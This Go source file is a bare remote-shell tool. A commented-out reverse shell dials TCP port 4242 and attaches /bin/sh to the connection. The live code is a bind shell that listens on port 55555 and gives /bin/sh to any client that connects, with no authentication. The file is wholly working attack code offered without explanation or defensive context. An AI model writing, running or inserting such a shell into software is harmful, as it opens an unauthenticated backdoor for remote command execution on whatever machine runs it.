package main

import (
	"net"
	"os/exec"
)

func main() {
	// Reverse Shell
	/*
		c,_:=net.Dial("tcp",":4242")
		cmd:=exec.Command("/bin/sh")
		cmd.Stdin=c
		cmd.Stdout=c
		cmd.Stderr=c
		cmd.Run()
	*/
	// Bind Shell
	listener, _ := net.Listen("tcp", ":55555")
	defer listener.Close()
	for {
		c, err:= listener.Accept()
		if err != nil {
			return
		}
		cmd := exec.Command("/bin/sh")
		cmd.Stdin = c
		cmd.Stdout = c
		cmd.Stderr = c

		cmd.Run()
	}
}
